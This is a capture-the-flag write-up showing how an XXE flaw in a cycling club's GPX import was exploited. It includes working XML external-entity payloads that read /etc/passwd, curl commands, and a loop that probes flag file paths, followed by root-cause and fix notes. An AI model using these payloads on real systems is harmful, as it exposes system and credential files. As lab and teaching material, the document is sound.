# Chainline — XXE via GPX Import
**Difficulty:** Easy · **Category:** XML External Entity Injection · **Platform:** WebVerse Pro

Flag redacted throughout — replace `WEBVERSE{REDACTED}` with your own captured value.

---

## Challenge Briefing

> The club outgrew its spreadsheet, so one of the members built a proper tracker over a couple of winters. The part everyone loves is import. Drop in the file your head unit saved and the whole ride appears, mapped and broken down by the kilometre. Whoever wrote it reckoned a file off your own device was safe enough to trust. It has not been touched since.

Two phrases matter here. "The file your head unit saved" points at **GPX** — the standard XML-based track format exported by GPS/bike/car computers. "A file off your own device was safe enough to trust" is the real tell: it's telling you, in-fiction, that the developer trusted client-supplied files without hardening the parser. Any time a challenge editorializes about *trust* around a *file format that's secretly XML*, think XXE first.

## Setting Up

Registered a normal account so we could reach the authenticated import feature:

```bash
TARGET="https://<chainline-instance>"

curl -s -b cookies.txt -c cookies.txt -i -X POST "$TARGET/register.php" \
  --data-urlencode "display_name=Iam Unknown" \
  --data-urlencode "email=iamunknown77@example.com" \
  --data-urlencode "password=Passw0rdXyz9" \
  --data-urlencode "password_confirm=Passw0rdXyz9"
```

`302` to `/account/` with a fresh `PHPSESSID` cookie confirmed the account was live.

## Mapping the Import Feature

```bash
curl -s -b cookies.txt "$TARGET/import.php" -o import.html
sed -n '/<form/,/<\/form>/p' import.html
```

```html
<form class="import-form" method="post" action="/import.php" enctype="multipart/form-data">
  <input type="file" id="gpx" name="gpx" accept=".gpx,application/gpx+xml,application/xml,text/xml">
  <textarea name="gpx_text" rows="10" ...></textarea>
  <button type="submit">Import ride</button>
  <a href="/static/sample-ride.gpx" download>Download a sample .gpx</a>
</form>
```

Two upload paths exist — a file field and a `gpx_text` textarea. The textarea is strictly better for us: no multipart boundary fuss, no MIME sniffing to fight, just raw XML in a form field.

The `accept` attribute on the file input listing `application/xml` and `text/xml` alongside `.gpx` all but confirms this is parsed with a general-purpose XML parser rather than a GPX-specific streaming reader — another point in favor of XXE being in scope.

## Learning the Expected Shape

Before breaking anything, it's worth seeing a valid file, both to confirm the schema and to have a clean template to graft a malicious `DOCTYPE` onto:

```bash
curl -s -b cookies.txt "$TARGET/static/sample-ride.gpx" -o sample.gpx
cat sample.gpx
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<gpx version="1.1" creator="Chainline sample" xmlns="http://www.topografix.com/GPX/1/1">
  <metadata>
    <name>Saturday Club Loop</name>
    <desc>...</desc>
  </metadata>
  <trk>
    <name>Saturday Club Loop</name>
    <desc>...</desc>
    <trkseg>
      <trkpt lat="53.48010" lon="-2.24230"><ele>41</ele><time>...</time></trkpt>
      ...
    </trkseg>
  </trk>
</gpx>
```

Standard GPX 1.1. `<trk><name>` and `<trk><desc>` are both later rendered back to the user on the ride detail page — those are our reflection points.

## First XXE Test

Standard classic (non-blind) XXE: declare an external general entity pointing at a well-known local file, then reference that entity somewhere the app echoes back to us.

```bash
cat > xxe1.gpx << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE gpx [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<gpx version="1.1">
  <trk>
    <name>&xxe;</name>
    <trkseg><trkpt lat="0" lon="0"></trkpt></trkseg>
  </trk>
</gpx>
EOF

curl -s -b cookies.txt -c cookies.txt -i -X POST "$TARGET/import.php" \
  --data-urlencode "gpx_text@xxe1.gpx" \
  -o import_result.html
```

The response was a `303 See Other` to `/ride.php?id=N` — the import succeeded and created a new ride record. Following the redirect:

```bash
curl -s -b cookies.txt -c cookies.txt -L -X POST "$TARGET/import.php" \
  --data-urlencode "gpx_text@xxe1.gpx" \
  -o import_final.html

grep -i "passwd\|root:\|error\|xml" import_final.html
```

```html
<title>root:x:0:0:root:/root:/bin/bash
<h1 class="ride-title">root:x:0:0:root:/root:/bin/bash
```

The entity resolved and `/etc/passwd`'s first line landed directly in the page `<title>` and the `ride-title` heading — both places the app normally puts the track's `<name>`. This is a fully **in-band, non-blind XXE**: no need for out-of-band exfiltration via a listener, the file content is reflected straight into the HTTP response.

## Finding the Flag

With read-arbitrary-local-file confirmed, it's just a matter of guessing (or knowing from the theme) where the flag lives. Looped a small set of common CTF flag locations through the same technique:

```bash
for f in "/flag.txt" "/flag" "/var/www/html/flag.txt" "/var/www/flag.txt" "/app/flag.txt" "/flag.php"; do
  echo "=== trying $f ==="
  cat > xxe_try.gpx << EOF
<?xml version="1.0"?>
<!DOCTYPE gpx [
  <!ENTITY xxe SYSTEM "file://$f">
]>
<gpx version="1.1">
  <trk>
    <name>&xxe;</name>
    <trkseg><trkpt lat="0" lon="0"></trkpt></trkseg>
  </trk>
</gpx>
EOF
  curl -s -b cookies.txt -c cookies.txt -L -X POST "$TARGET/import.php" \
    --data-urlencode "gpx_text@xxe_try.gpx" \
    -o out.html
  grep -oP '(?<=ride-title">).*?(?=</h1>)' out.html
done
```

`/flag.txt` hit on the first pass:

```
=== trying /flag.txt ===
WEBVERSE{REDACTED}
```

**Flag:** `WEBVERSE{REDACTED}`

## What Went Wrong (Root Cause)

The import endpoint parsed user-supplied GPX with a generic XML parser that had DTD processing and external entity resolution left enabled — the default, unsafe configuration in many XML libraries (`libxml2`/PHP's `DOMDocument`, Python's stdlib `xml.etree` in older configurations, Java's default `DocumentBuilderFactory`, etc. all ship "trusting" by default). Because the parsed `<name>`/`<desc>` values are then rendered verbatim into the ride page, the vulnerability was immediately observable rather than blind — a much bigger real-world impact than the CTF framing suggests, since in production this pattern typically enables full local file read, SSRF via `http://` entities, and sometimes denial-of-service via entity expansion ("billion laughs").

## Fix

- Disable DTD/external entity processing entirely at the parser level before touching user input (e.g. `libxml_disable_entity_loader(true)` historically, or configuring the parser with `resolve_entities=False` / a hardened `DocumentBuilderFactory` with `FEATURE_SECURE_PROCESSING`).
- Prefer a GPX-specific schema-validating parser over a generic XML DOM parser for a narrow format like GPX.
- Treat any user-uploaded XML-based format (GPX, SVG, DOCX/XLSX internals, RSS, SOAP) as hostile input by default.
